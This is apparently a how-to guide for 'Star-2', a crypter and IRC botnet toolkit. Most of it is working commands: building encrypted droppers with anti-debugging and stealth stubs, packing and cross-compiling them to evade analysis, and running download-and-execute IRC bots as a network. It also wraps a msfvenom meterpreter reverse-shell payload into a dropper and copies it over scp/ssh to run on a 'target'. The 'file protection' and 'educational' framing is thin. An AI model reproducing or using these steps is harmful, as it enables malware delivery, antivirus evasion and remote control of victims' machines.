# 🚀 Star-2 Complete How-To Guide

## 📋 Table of Contents
1. [System Requirements](#system-requirements)
2. [Installation & Setup](#installation--setup)
3. [Basic Usage](#basic-usage)
4. [Advanced Features](#advanced-features)
5. [mIRC Bot Setup](#mirc-bot-setup)
6. [Troubleshooting](#troubleshooting)
7. [Examples & Use Cases](#examples--use-cases)
8. [Security Best Practices](#security-best-practices)

---

## 🔧 System Requirements

### **Minimum Requirements:**
- **OS**: Linux, Windows, or macOS
- **Compiler**: GCC 7+ or compatible C++ compiler
- **Memory**: 512MB RAM
- **Storage**: 100MB free space
- **Network**: Internet connection (for mIRC bot)

### **Recommended:**
- **OS**: Linux (Ubuntu 20.04+)
- **Compiler**: GCC 9+ or Clang 10+
- **Memory**: 2GB+ RAM
- **Storage**: 500MB+ free space
- **Network**: Stable internet connection

---

## ⚡ Installation & Setup

### **Step 1: Download & Extract**
```bash
# Clone the repository
git clone https://github.com/ItsMehRAWRXD/Star.git
cd Star

# Or download and extract manually
wget https://github.com/ItsMehRAWRXD/Star/archive/star-2.zip
unzip star-2.zip
cd Star-star-2
```

### **Step 2: Compile All Components**
```bash
# Method 1: Use Makefile (recommended)
make clean
make

# Method 2: Compile individually
g++ -o native_stub_generator native_stub_generator.cpp
g++ -o native_encryptor native_encryptor.cpp
g++ -o stub_linker stub_linker.cpp
g++ -o mirc_bot_builder mirc_bot_builder.cpp
g++ -o drag_drop_encryptor drag_drop_encryptor.cpp
```

### **Step 3: Verify Installation**
```bash
# Check if all executables were created
ls -la native_stub_generator native_encryptor stub_linker mirc_bot_builder

# Test basic functionality
./native_stub_generator --help
./native_encryptor --help
```

---

## 🎯 Basic Usage

### **1. Generate Your First Stub**

#### **Standalone Stub (Recommended for beginners):**
```bash
# Generate a basic standalone stub
./native_stub_generator --standalone my_first_stub.cpp standalone_basic

# Generate an advanced standalone stub
./native_stub_generator --standalone my_advanced_stub.cpp standalone_advanced

# Generate a stealth standalone stub
./native_stub_generator --standalone my_stealth_stub.cpp standalone_stealth
```

#### **Stub with Embedded Payload:**
```bash
# Create a stub that embeds and encrypts a file
./native_stub_generator my_file.exe my_dropper.cpp basic

# Create an advanced dropper
./native_stub_generator my_file.exe my_advanced_dropper.cpp advanced
```

### **2. Encrypt Files Separately**
```bash
# Encrypt any file
./native_encryptor input_file.exe encrypted_file.bin

# Encrypt with custom output
./native_encryptor document.pdf encrypted_doc.bin

# Encrypt multiple files
for file in *.exe; do
    ./native_encryptor "$file" "${file}.encrypted"
done
```

### **3. Link Stubs with Payloads**
```bash
# Link a standalone stub with an encrypted file
./stub_linker my_stub.cpp encrypted_file.bin final_dropper.cpp

# Link with different stub types
./stub_linker my_advanced_stub.cpp encrypted_file.bin advanced_dropper.cpp
```

### **4. Compile Final Executables**
```bash
# Compile the final dropper
g++ -o final_dropper final_dropper.cpp

# Compile with optimizations
g++ -O2 -s -o final_dropper final_dropper.cpp

# Compile for Windows (cross-compilation)
x86_64-w64-mingw32-g++ -o final_dropper.exe final_dropper.cpp
```

---

## 🔥 Advanced Features

### **1. Stub Types Explained**

#### **Basic Stub:**
- Simple AES-128-CTR decryption
- Smallest size (~6.5KB)
- Fastest execution
- **Best for**: Simple payloads, speed-critical applications

#### **Advanced Stub:**
- Polymorphic code generation
- Anti-debugging techniques
- String obfuscation
- **Best for**: Malware analysis evasion, security testing

#### **Stealth Stub:**
- Minimal footprint
- Enhanced stealth features
- System tray operation
- **Best for**: Covert operations, persistence

### **2. Advanced Stub Generation**
```bash
# Generate with specific features
./native_stub_generator --standalone custom_stub.cpp standalone_advanced

# Generate multiple stubs for testing
for i in {1..10}; do
    ./native_stub_generator --standalone stub_${i}.cpp standalone_basic
done

# Generate with different types
./native_stub_generator --standalone basic_stub.cpp standalone_basic
./native_stub_generator --standalone advanced_stub.cpp standalone_advanced
./native_stub_generator --standalone stealth_stub.cpp standalone_stealth
```

### **3. Batch Processing**
```bash
#!/bin/bash
# batch_encrypt.sh - Encrypt multiple files

for file in *.exe; do
    echo "Encrypting $file..."
    ./native_encryptor "$file" "${file}.encrypted"
    
    # Generate stub for each file
    ./native_stub_generator --standalone "${file}_stub.cpp" standalone_basic
    
    # Link stub with encrypted file
    ./stub_linker "${file}_stub.cpp" "${file}.encrypted" "${file}_dropper.cpp"
    
    # Compile final dropper
    g++ -O2 -s -o "${file}_dropper" "${file}_dropper.cpp"
done
```

---

## 🤖 mIRC Bot Setup

### **1. Basic Bot Setup**
```bash
# Build the mIRC bot
./mirc_bot_builder StarBot_bot.cpp

# The bot will be compiled as 'mirc_bot_builder'
```

### **2. Bot Configuration**
The bot comes pre-configured with:
- **Server**: `irc.rizon.net`
- **Channel**: `#rawr`
- **Admin**: `ItsMehRawrXD`
- **Auto-rename**: Enabled (adds random number if nickname taken)

### **3. Bot Commands**

#### **File Operations:**
```
!upload filename.txt          # Upload file to bot
!download http://url/file.exe # Download file from URL
!execute downloaded_file.exe  # Execute downloaded file
!downloadurl http://url/file.exe # Download and execute
```

#### **System Commands:**
```
!botkill                     # Scan and remove malware
!restart soft                # Soft restart (reconnect)
!restart hard                # Hard restart (full restart)
!restart update              # Update and restart
```

#### **Advanced Commands:**
```
!uploadurl http://url/file.exe # Upload file from URL
!downloadandexecute http://url/file.exe # Download and execute
```

### **4. Running the Bot**
```bash
# Run the bot
./mirc_bot_builder

# Run in background
nohup ./mirc_bot_builder > bot.log 2>&1 &

# Check bot status
ps aux | grep mirc_bot_builder
```

---

## 🔧 Troubleshooting

### **Common Issues & Solutions**

#### **1. Compilation Errors**
```bash
# Error: "g++: command not found"
sudo apt-get install build-essential  # Ubuntu/Debian
sudo yum install gcc-c++              # CentOS/RHEL

# Error: "std::random_device not found"
# Update to GCC 7+ or add -std=c++11 flag
g++ -std=c++11 -o native_stub_generator native_stub_generator.cpp
```

#### **2. Runtime Errors**
```bash
# Error: "Permission denied"
chmod +x native_stub_generator native_encryptor stub_linker

# Error: "File not found"
# Check if files exist in current directory
ls -la *.cpp *.exe
```

#### **3. Stub Generation Issues**
```bash
# If stubs are not unique
# Ensure you're using the latest version with improved RNG
git pull origin star-2
make clean && make

# If stub linker fails
# Check if stub file contains valid key/nonce
grep -A 2 "const std::string" your_stub.cpp
```

#### **4. mIRC Bot Issues**
```bash
# Bot won't connect
# Check internet connection and firewall
ping irc.rizon.net

# Bot commands not working
# Ensure you're the admin user (ItsMehRawrXD)
# Check bot logs for errors
tail -f bot.log
```

### **Debug Mode**
```bash
# Enable debug output
export DEBUG=1
./native_stub_generator --standalone debug_stub.cpp standalone_basic

# Verbose compilation
g++ -v -o native_stub_generator native_stub_generator.cpp
```

---

## 📚 Examples & Use Cases

### **Example 1: Simple File Protection**
```bash
# Protect a sensitive document
./native_encryptor secret_document.pdf encrypted_doc.bin
./native_stub_generator --standalone doc_stub.cpp standalone_basic
./stub_linker doc_stub.cpp encrypted_doc.bin doc_dropper.cpp
g++ -o doc_dropper doc_dropper.cpp

# Now doc_dropper will decrypt and open the document
```

### **Example 2: Malware Analysis Evasion**
```bash
# Create an advanced dropper for analysis
./native_stub_generator malware_sample.exe analysis_dropper.cpp advanced
g++ -O2 -s -o analysis_dropper analysis_dropper.cpp

# The dropper includes anti-debugging and obfuscation
```

### **Example 3: Batch File Protection**
```bash
#!/bin/bash
# protect_all.sh - Protect all executables in directory

mkdir -p protected
for exe in *.exe; do
    echo "Protecting $exe..."
    
    # Encrypt file
    ./native_encryptor "$exe" "protected/${exe}.encrypted"
    
    # Generate stub
    ./native_stub_generator --standalone "protected/${exe}_stub.cpp" standalone_stealth
    
    # Link and compile
    ./stub_linker "protected/${exe}_stub.cpp" "protected/${exe}.encrypted" "protected/${exe}_dropper.cpp"
    g++ -O2 -s -o "protected/${exe}_protected" "protected/${exe}_dropper.cpp"
    
    echo "Created protected/${exe}_protected"
done
```

### **Example 4: mIRC Bot Network**
```bash
# Deploy multiple bots
for i in {1..5}; do
    cp mirc_bot_builder bot_${i}
    nohup ./bot_${i} > bot_${i}.log 2>&1 &
    echo "Started bot_${i} (PID: $!)"
done

# Monitor all bots
watch -n 5 'ps aux | grep mirc_bot_builder'
```

---

## 🔒 Security Best Practices

### **1. Key Management**
```bash
# Never hardcode keys in production
# Use environment variables
export ENCRYPTION_KEY="your_secret_key"
./native_encryptor input_file output_file

# Or use random key generation (recommended)
./native_encryptor input_file output_file  # Uses random key
```

### **2. File Permissions**
```bash
# Secure your executables
chmod 700 native_stub_generator native_encryptor stub_linker
chmod 600 *.cpp *.bin

# Protect sensitive files
chmod 400 secret_document.pdf
```

### **3. Network Security**
```bash
# Use VPN for mIRC bot connections
# Configure firewall rules
sudo ufw allow out 6667  # IRC port
sudo ufw deny out 6667   # Block IRC if needed
```

### **4. Obfuscation Techniques**
```bash
# Strip symbols from final executables
strip final_dropper

# Use UPX for additional compression
upx --best final_dropper

# Cross-compile to avoid analysis
x86_64-w64-mingw32-g++ -o dropper.exe dropper.cpp
```

---

## 🎓 Advanced Techniques

### **1. Custom Stub Templates**
```cpp
// Create custom stub template
// Add to native_stub_generator.cpp

std::string generateCustomTemplate() {
    return R"(
        // Custom stub template
        #include <iostream>
        #include <fstream>
        
        int main() {
            // Your custom decryption logic here
            return 0;
        }
    )";
}
```

### **2. Integration with Other Tools**
```bash
# Integrate with Metasploit
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > payload.bin
./native_encryptor payload.bin encrypted_payload.bin
./stub_linker my_stub.cpp encrypted_payload.bin msf_dropper.cpp
```

### **3. Automated Deployment**
```bash
#!/bin/bash
# auto_deploy.sh - Automated deployment script

# Build all components
make clean && make

# Generate stubs
./native_stub_generator --standalone deploy_stub.cpp standalone_stealth

# Encrypt payload
./native_encryptor payload.exe encrypted_payload.bin

# Create dropper
./stub_linker deploy_stub.cpp encrypted_payload.bin deploy_dropper.cpp
g++ -O2 -s -o deploy_dropper deploy_dropper.cpp

# Deploy to target
scp deploy_dropper user@target:/tmp/
ssh user@target "chmod +x /tmp/deploy_dropper && /tmp/deploy_dropper"
```

---

## 📞 Support & Resources

### **Getting Help**
1. **Check the logs**: Look for error messages in output
2. **Verify versions**: Ensure you're using the latest code
3. **Test components**: Test each component individually
4. **Check permissions**: Ensure proper file permissions

### **Useful Commands**
```bash
# Check system info
uname -a
gcc --version

# Check file integrity
md5sum native_stub_generator
sha256sum native_encryptor

# Monitor system resources
top -p $(pgrep native_stub_generator)
```

### **Performance Tips**
- Use `-O2` optimization for faster execution
- Use `-s` flag to strip symbols and reduce size
- Use UPX for additional compression
- Cross-compile for target platform compatibility

---

## 🎉 Congratulations!

You've now mastered the Star-2 system! You can:
- ✅ Generate unique stubs with 100% uniqueness
- ✅ Encrypt any file type with AES-128-CTR
- ✅ Create advanced droppers with anti-analysis features
- ✅ Deploy and manage mIRC bot networks
- ✅ Troubleshoot and optimize performance

**Remember**: Use this system responsibly and in accordance with applicable laws and regulations.

---

*Star-2 How-To Guide v2.0 - Complete Edition*  
*Built with ❤️ for educational and research purposes*